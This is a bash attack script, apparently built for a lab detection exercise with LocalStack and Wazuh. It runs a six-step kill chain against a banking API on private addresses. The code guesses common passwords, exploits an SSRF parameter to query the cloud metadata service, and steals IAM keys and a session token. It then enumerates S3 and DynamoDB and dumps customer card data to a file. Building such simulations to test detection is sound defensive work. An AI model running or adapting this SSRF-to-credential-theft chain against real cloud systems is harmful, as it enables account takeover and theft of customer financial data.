#!/bin/bash
# ══════════════════════════════════════════════════════════════
#  ⚔️  FULL ATTACK CHAIN — Cloud Supply Chain Compromise
#  Execute from: Kali VM (192.168.100.30)
#  Target:       Cloud Target VM (192.168.100.20)
#
#  Kill Chain:
#    Step 1 → Reconnaissance (discover the banking app)
#    Step 2 → Authentication (login to get API token)
#    Step 3 → SSRF Discovery (probe internal network)
#    Step 4 → SSRF Exploit (steal IAM creds from IMDS)
#    Step 5 → Privilege Escalation (use stolen credentials)
#    Step 6 → Data Exfiltration (dump DynamoDB table)
# ══════════════════════════════════════════════════════════════

TARGET="http://192.168.100.20:8080"
LOCALSTACK="http://192.168.100.20:4566"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

pause() {
    echo ""
    echo -e "${YELLOW}[Press ENTER to continue to next step...]${NC}"
    read -r
}

echo -e "${RED}"
echo "  ╔══════════════════════════════════════════════════╗"
echo "  ║     ⚔️  CLOUD SUPPLY CHAIN ATTACK SIMULATION    ║"
echo "  ║          Phase 4 — Attack Execution              ║"
echo "  ╚══════════════════════════════════════════════════╝"
echo -e "${NC}"

# ═══════════════════════════════════════════════════════════
#  STEP 1: RECONNAISSANCE
# ═══════════════════════════════════════════════════════════
echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  STEP 1: RECONNAISSANCE — Discovering the target${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${YELLOW}[*] Probing target at ${TARGET}...${NC}"

HEALTH=$(curl -s ${TARGET}/health)
echo -e "${GREEN}[+] Target is alive: ${HEALTH}${NC}"

echo ""
echo -e "${YELLOW}[*] Checking for common API endpoints...${NC}"
echo -e "    /api/auth/login     → $(curl -s -o /dev/null -w '%{http_code}' -X POST ${TARGET}/api/auth/login)"
echo -e "    /api/account/me     → $(curl -s -o /dev/null -w '%{http_code}' ${TARGET}/api/account/me)"
echo -e "    /api/payments/verify-gateway → $(curl -s -o /dev/null -w '%{http_code}' "${TARGET}/api/payments/verify-gateway")"

echo ""
echo -e "${GREEN}[+] Found a banking API with a suspicious 'verify-gateway' endpoint!${NC}"

pause

# ═══════════════════════════════════════════════════════════
#  STEP 2: AUTHENTICATION — Get a valid session
# ═══════════════════════════════════════════════════════════
echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  STEP 2: AUTHENTICATION — Logging in with leaked creds${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo ""

# Simulate a failed login first (triggers brute force detection)
echo -e "${YELLOW}[*] Attempting common credentials...${NC}"
echo -e "${RED}[-] admin:password123 → $(curl -s -X POST ${TARGET}/api/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"admin","password":"password123"}' | jq -r '.message // .error // "failed"')${NC}"

echo -e "${RED}[-] admin:admin → $(curl -s -X POST ${TARGET}/api/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"admin","password":"admin"}' | jq -r '.message // .error // "failed"')${NC}"

# Successful login
echo -e "${YELLOW}[*] Trying leaked credential: admin:admin123${NC}"
LOGIN_RESPONSE=$(curl -s -X POST ${TARGET}/api/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"admin","password":"admin123"}')

TOKEN=$(echo ${LOGIN_RESPONSE} | jq -r '.token')
echo -e "${GREEN}[+] LOGIN SUCCESS! Token: ${TOKEN}${NC}"
echo ""
echo -e "${GREEN}[+] Account info:${NC}"
echo "${LOGIN_RESPONSE}" | jq '.account | {name, id, balance, currency}'

pause

# ═══════════════════════════════════════════════════════════
#  STEP 3: SSRF DISCOVERY — Probe internal network
# ═══════════════════════════════════════════════════════════
echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  STEP 3: SSRF DISCOVERY — Probing internal services${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}[*] Testing verify-gateway for SSRF...${NC}"
echo -e "${YELLOW}[*] Requesting: http://localhost:8080/health (loopback)${NC}"

SSRF_TEST=$(curl -s "${TARGET}/api/payments/verify-gateway?endpoint=http://localhost:8080/health" \
    -H "Authorization: Bearer ${TOKEN}")
echo -e "${GREEN}[+] SSRF CONFIRMED! Server fetched internal resource:${NC}"
echo "${SSRF_TEST}" | jq '.'

echo ""
echo -e "${YELLOW}[*] Probing for internal Docker services...${NC}"
echo -e "${YELLOW}[*] Trying: http://imds/latest/meta-data/ (IMDS)${NC}"

IMDS_PROBE=$(curl -s "${TARGET}/api/payments/verify-gateway?endpoint=http://imds/latest/meta-data" \
    -H "Authorization: Bearer ${TOKEN}")
echo -e "${GREEN}[+] IMDS SERVICE FOUND! Metadata endpoints:${NC}"
echo "${IMDS_PROBE}" | jq '.'

pause

# ═══════════════════════════════════════════════════════════
#  STEP 4: SSRF EXPLOIT — Steal IAM credentials from IMDS
# ═══════════════════════════════════════════════════════════
echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  STEP 4: SSRF EXPLOIT — Stealing IAM Credentials${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}[*] Step 4a: Discovering IAM role name...${NC}"
ROLE_RESPONSE=$(curl -s "${TARGET}/api/payments/verify-gateway?endpoint=http://imds/latest/meta-data/iam/security-credentials" \
    -H "Authorization: Bearer ${TOKEN}")
ROLE_NAME=$(echo "${ROLE_RESPONSE}" | jq -r '.data')
echo -e "${GREEN}[+] IAM Role found: ${ROLE_NAME}${NC}"

echo ""
echo -e "${YELLOW}[*] Step 4b: Stealing temporary credentials for role '${ROLE_NAME}'...${NC}"
CREDS_RESPONSE=$(curl -s "${TARGET}/api/payments/verify-gateway?endpoint=http://imds/latest/meta-data/iam/security-credentials/${ROLE_NAME}" \
    -H "Authorization: Bearer ${TOKEN}")

echo -e "${RED}${BOLD}[!!!] CREDENTIALS STOLEN:${NC}"
echo "${CREDS_RESPONSE}" | jq '.data'

# Parse stolen credentials
ACCESS_KEY=$(echo "${CREDS_RESPONSE}" | jq -r '.data.AccessKeyId')
SECRET_KEY=$(echo "${CREDS_RESPONSE}" | jq -r '.data.SecretAccessKey')
SESSION_TOKEN=$(echo "${CREDS_RESPONSE}" | jq -r '.data.Token')

echo ""
echo -e "${GREEN}[+] AccessKeyId:     ${ACCESS_KEY}${NC}"
echo -e "${GREEN}[+] SecretAccessKey: ${SECRET_KEY}${NC}"
echo -e "${GREEN}[+] SessionToken:    ${SESSION_TOKEN}${NC}"

pause

# ═══════════════════════════════════════════════════════════
#  STEP 5: PRIVILEGE ESCALATION — Configure stolen creds
# ═══════════════════════════════════════════════════════════
echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  STEP 5: PRIVILEGE ESCALATION — Using stolen credentials${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo ""

# Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID="${ACCESS_KEY}"
export AWS_SECRET_ACCESS_KEY="${SECRET_KEY}"
export AWS_SESSION_TOKEN="${SESSION_TOKEN}"
export AWS_DEFAULT_REGION="us-east-1"

echo -e "${YELLOW}[*] Configuring AWS CLI with stolen credentials...${NC}"
echo -e "${GREEN}[+] AWS CLI configured with stolen IAM role: ${ROLE_NAME}${NC}"

echo ""
echo -e "${YELLOW}[*] Enumerating S3 buckets...${NC}"
S3_BUCKETS=$(aws --endpoint-url=${LOCALSTACK} s3 ls 2>/dev/null)
echo -e "${GREEN}[+] S3 Buckets found:${NC}"
echo "${S3_BUCKETS}"

echo ""
echo -e "${YELLOW}[*] Enumerating DynamoDB tables...${NC}"
TABLES=$(aws --endpoint-url=${LOCALSTACK} dynamodb list-tables 2>/dev/null)
echo -e "${GREEN}[+] DynamoDB Tables found:${NC}"
echo "${TABLES}" | jq '.'

pause

# ═══════════════════════════════════════════════════════════
#  STEP 6: DATA EXFILTRATION — Dump the entire database
# ═══════════════════════════════════════════════════════════
echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  STEP 6: DATA EXFILTRATION — Dumping DynamoDB${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo ""

TABLE_NAME=$(echo "${TABLES}" | jq -r '.TableNames[0]')
echo -e "${YELLOW}[*] Target table: ${TABLE_NAME}${NC}"
echo -e "${YELLOW}[*] Performing full table SCAN (this triggers CRITICAL alert)...${NC}"
echo ""

EXFIL_DATA=$(aws --endpoint-url=${LOCALSTACK} dynamodb scan --table-name "${TABLE_NAME}" 2>/dev/null)

echo -e "${RED}${BOLD}[!!!] DATA EXFILTRATED — Customer records:${NC}"
echo "${EXFIL_DATA}" | jq '.Items[] | {
    ClientId: .ClientId.S,
    Name: .Name.S,
    CreditCard: .CreditCard.S,
    SecretCode: .SecretCode.S
}'

RECORD_COUNT=$(echo "${EXFIL_DATA}" | jq '.Count')
echo ""
echo -e "${RED}[!!!] Total records exfiltrated: ${RECORD_COUNT}${NC}"

# Save exfiltrated data
echo "${EXFIL_DATA}" > /tmp/exfiltrated_data.json
echo -e "${GREEN}[+] Data saved to: /tmp/exfiltrated_data.json${NC}"

echo ""
echo -e "${RED}${BOLD}"
echo "  ╔══════════════════════════════════════════════════╗"
echo "  ║          ⚔️  ATTACK CHAIN COMPLETE!              ║"
echo "  ║                                                  ║"
echo "  ║  SSRF → IMDS → IAM Creds → DynamoDB Dump        ║"
echo "  ║                                                  ║"
echo "  ║  Check Wazuh Dashboard for alerts:               ║"
echo "  ║  https://192.168.100.10                          ║"
echo "  ╚══════════════════════════════════════════════════╝"
echo -e "${NC}"
